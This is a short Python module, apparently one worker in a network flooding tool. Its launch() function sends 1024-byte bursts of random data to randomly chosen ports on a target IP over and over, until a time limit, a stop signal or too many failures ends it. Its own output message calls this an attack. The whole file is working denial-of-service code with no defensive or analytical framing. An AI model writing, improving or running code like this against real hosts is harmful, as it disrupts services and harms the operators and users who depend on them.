import socket
import random
import time

def launch(target_ip, ports, duration, tag, stop_event, fail_tracker):
    if not ports:
        print(f"[!] {tag} no ports provided to attack.")
        fail_tracker[tag] = True
        return

    start_time = time.time()
    failed = 0

    while not stop_event.is_set():
        if duration and time.time() - start_time > duration:
            break

        port = random.choice(ports)

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, port))
            sock.send(random._urandom(1024))
            sock.close()
        except Exception:
            failed += 1
            if failed > 20:
                fail_tracker[tag] = True
                break

        time.sleep(0.01)
